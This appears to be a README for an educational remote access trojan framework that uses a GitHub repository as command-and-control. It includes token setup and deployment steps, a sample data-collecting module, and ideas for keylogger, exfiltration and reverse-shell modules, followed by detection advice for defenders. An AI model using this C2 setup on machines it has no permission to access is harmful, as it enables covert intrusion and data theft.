# GitHub-based RAT Framework

**Educational purposes only - This tool is for learning about cybersecurity and should only be used on systems you own or have explicit permission to test.**

## Overview

This project demonstrates how Remote Access Trojans (RATs) can use GitHub as a Command and Control (C2) infrastructure. The Trojan periodically polls a GitHub repository for configuration and modules, executes them, and uploads results back to the repository.

Based on concepts from "Black Hat Python" by Justin Seitz and Tim Arnold.

## How RATs Are Spread

- **Phishing Emails**: Trick victims into downloading and executing the RAT
- **Malicious Downloads**: RATs hidden in seemingly legitimate software
- **Exploits**: Exploit vulnerabilities to install RATs without victim knowledge
- **Social Engineering**: Convince victims to install RATs thinking they're useful applications

## Project Structure

```
├── Trojan/           # Main Trojan framework
│   └── trojan.py     # Main RAT code
├── modules/          # Individual RAT modules
│   ├── dirlister.py  # Directory listing module
│   └── environment.py # Environment variables module
├── config/           # Configuration files
│   └── abc.json      # Module configuration
├── data/            # Results storage (uploaded by Trojan)
├── status/          # Status updates from Trojan
└── .gitignore       # Git ignore file
```

## Setup Instructions

### 1. GitHub Repository Setup

1. **Create GitHub Account**: Sign up at [github.com](https://github.com)
2. **Create New Repository**: 
   - Click "New repository"
   - Give it a name (e.g., `trojan-c2`)
   - Choose public or private
3. **Generate Personal Access Token**:
   - Go to Settings → Developer settings → Personal access tokens → Tokens (classic)
   - Click "Generate new token (classic)"
   - Give it a name and choose expiration
   - Select full access permissions
   - Copy the token (you won't see it again)

### 2. Local Setup

```bash
# Clone your repository
git clone https://github.com/username/your-repo-name.git
cd your-repo-name

# Create directory structure
mkdir -p Trojan data modules config status

# Create .gitignore file
touch .gitignore

# Add and commit initial structure
git add .
git commit -m "Initial repository structure"
git remote set-url origin https://username:TOKEN@github.com/username/repo-name
git push origin main
```

### 3. Configure the Trojan

Edit `Trojan/trojan.py` and update these variables:
```python
GITHUB_TOKEN = "YOUR_ACTUAL_GITHUB_TOKEN"
REPO_OWNER = "YOUR_GITHUB_USERNAME"
REPO_NAME = "YOUR_REPOSITORY_NAME"
```

### 4. Install Dependencies

```bash
pip install requests
```

### 5. Run the Trojan

```bash
cd Trojan
python3 trojan.py
```

## Module Development

### Creating New Modules

Each module must:
1. Be placed in the `modules/` directory
2. Have a `.py` extension
3. Include a `run()` function that accepts `**kwargs`
4. Return results (can be any serializable data)

### Example Module

```python
import os
import platform

def run(**args):
    """
    System information module
    Returns basic system information
    """
    print("[*] In system_info module")
    
    info = {
        "platform": platform.platform(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": os.uname().nodename if hasattr(os, 'uname') else 'unknown'
    }
    
    return info
```

### Adding Modules to Configuration

Edit `config/abc.json` to include your new module:

```json
[
  {
    "module" : "dirlister"
  },
  {
    "module" : "environment"
  },
  {
    "module" : "system_info"
  }
]
```

### Committing Changes

After adding or modifying modules:

```bash
git add .
git commit -m "Added system_info module"
git push origin main
```

## How It Works

1. **Configuration Polling**: Trojan checks GitHub for configuration updates
2. **Module Loading**: Dynamically loads modules specified in config
3. **Module Execution**: Runs each module and collects results
4. **Result Upload**: Uploads results back to GitHub repository
5. **Status Updates**: Updates Trojan status periodically

## Security Considerations

- The Trojan uses GitHub's API for C2 communications
- All communications are HTTPS encrypted
- Results are stored in the repository's data directory
- Status updates are stored in the status directory

## Educational Modules Included

### 1. Directory Lister (`dirlister.py`)
- Lists all files in current directory
- Demonstrates basic file system access

### 2. Environment Variables (`environment.py`)
- Returns all environment variables
- Shows system configuration information

## Potential Module Ideas

- **Keylogger**: Capture keystrokes
- **Screenshot**: Take screenshots of desktop
- **File Exfiltration**: Upload specific files
- **Reverse Shell**: Establish interactive shell access
- **Persistence**: Maintain access after reboot
- **Privilege Escalation**: Attempt to gain higher privileges

## Legal and Ethical Considerations

**WARNING**: This tool is for educational purposes only. 

- Only use on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- Misuse of this software may result in criminal charges
- Always follow applicable laws and regulations
- Consider the ethical implications of your actions

## Detection and Prevention

### For System Administrators:

1. **Monitor GitHub API calls** from internal systems
2. **Network traffic analysis** for GitHub connections
3. **Process monitoring** for unusual Python executions
4. **File integrity monitoring** for new Python scripts
5. **Application whitelisting** to prevent unauthorized execution

### Indicators of Compromise:

- Unexpected GitHub API traffic
- New Python processes making network connections
- Files uploaded to GitHub repositories
- Configuration files in unexpected locations

## Disclaimer

This project is provided for educational and research purposes only. The authors are not responsible for any misuse of this software. Users are responsible for ensuring compliance with all applicable laws and regulations.

## License

Educational Use Only - Not for malicious purposes
